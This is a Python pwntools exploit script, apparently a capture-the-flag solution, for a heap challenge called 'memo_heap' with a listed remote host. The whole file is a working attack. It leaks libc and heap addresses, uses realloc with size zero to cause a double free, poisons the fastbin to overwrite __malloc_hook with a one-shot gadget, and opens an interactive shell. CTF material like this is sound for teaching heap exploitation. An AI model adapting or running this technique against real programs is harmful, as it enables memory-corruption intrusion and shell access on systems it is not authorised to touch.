from pwn import *

def alloc(size, data):
	r.sendlineafter('choice: ', '1')
	r.sendlineafter('? ', str(size))

	if size == 0:
		return

	if len(data) < size:
		data += '\n'
	r.sendafter('memo: ', data)
	return

def edit(idx, size, data):
	r.sendlineafter('choice: ', '2')
	r.sendlineafter('edit: ', str(idx))

	if size == 0:
		return

	if len(data) < size:
		data += '\n'
	r.sendafter('memo: ', data)

	return

def show(idx):
	r.sendlineafter('choice: ', '3')
	r.sendlineafter('show: ', str(idx))
	return

def free(idx):
	r.sendlineafter('choice: ', '4')
	r.sendlineafter('delete: ', str(idx))
	return

def leak(idx, ru):
	show(idx)
	r.recvuntil(ru)
	return u64(r.recv(6).ljust(8, '\x00'))

def pwn():

	alloc(0x80, 'A'*8) # 0
	alloc(0x80, 'B'*8) # 1

	free(0)

	# Leak unsorted bin pointer because read will not null terminate
	alloc(0x8, 'C'*8) # 0

	libc    = leak(0, 'C'*8) - 0x3c4bf8
	mhook   = libc + 0x3c4b10
	oneshot = libc + 0xf1147
	log.success("Libc:          0x{:x}".format(libc))
	log.success("__malloc_hook: 0x{:x}".format(mhook))

	# Clean up the chunk array/heap
	free(0)
	free(1)

	alloc(0x80, 'D'*8) # 0
	alloc(0x80, 'E'*8) # 1
	alloc(0x80, 'F'*8) # 2
	alloc(0x80, 'G'*8) # 3
	# Boundary chunk to prevent top chunk consolidation/malloc_consolidate
	alloc(0x80, 'H'*8) # 4
	# Place enough chunks in the unsorted bin list
	# so that their BK/FD fields point to the heap
	free(0)
	free(2)
	free(3)
	
	alloc(0x8,  'I'*8) # 0
	# Heap leak
	alloc(0x8,  'J'*8) # 2
	
	heap = leak(2, 'J'*8) - 0x180
	log.success("Heap:          0x{:x}".format(heap))

	# Clean up the chunk array and the heap
	free(0)
	free(1)
	free(2)
	free(4)

	# Create UAF/double-free scenario
	alloc(0, '') 	          # memo_0
	alloc(0x80, 'A'*8)        # memo_1
	alloc(0x68, ' B'*8)       # memo_2
	# Craft fake chunk
	fake_chunk  = p64(0x21)*6
	# Fake free chunk which will be used as a nanme pointer
	fake_chunk += p64(heap + 0x200)
	fake_chunk += p64(0x20) * 9
	fake_chunk += p64(0)
	alloc(0x88, fake_chunk)   # memo_3
	# Take care of next size check when editing with realloc
	alloc(0x68, p64(0x21)*10) # memo_4
	# When realloc gets called, if the size argument is 0 and
	# the pointer is not null, it will return 0 and free the old pointer. 
	# See https://github.com/x3roo/heapwn/blob/master/malloc/__libc_realloc.c#L15
	# This action will free the memo pointer (0x555555757000).
	edit(0, 0, '')

	# Double-free
	free(1)
	free(0)

	#	(0x20)     fastbin[0]: 0x5555557572c0 --> 0x555555757000 --> 0x555555757020 --> 0x555555757000
	#	(0x30)     fastbin[1]: 0x0
	#	(0x40)     fastbin[2]: 0x0
	#	(0x50)     fastbin[3]: 0x0
	#	(0x60)     fastbin[4]: 0x0
	#	(0x70)     fastbin[5]: 0x0
	#	(0x80)     fastbin[6]: 0x0

	# Overwrite 0x555555757000->FD
	alloc(0x8, p64(heap + 0x1b0))
	alloc(0x18, 'lel')
	# Overwrite memo_4's size
	alloc(0x18, p64(0) + p64(0x71) + p64(0))
	# Place memo_4 in the fastbin list
	free(4)
	# Allocate memo_4 back in order to bypass https://github.com/x3roo/heapwn/blob/master/malloc/_int_realloc.c#L34
	alloc(0x68, p64(0x21)*2)
	# Free memo_4 again
	free(4)
	# memo_4->FD = __malloc_hook
	edit(5, 0x18, p64(0) + p64(0x71) + p64(mhook - 0x30 + 0xd))
	# Return heap chunk
	alloc(0x68, 'rekt')
	# __malloc_hook => one shot gadget
	alloc(0x68, 'A'*0x13+p64(oneshot))
	# Trigger one shot gadget
	r.sendline('1')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote('memoheap.acebear.site', 3003)
        pwn()
    else:
        r = process('./memo_heap')
        pause()
        pwn()
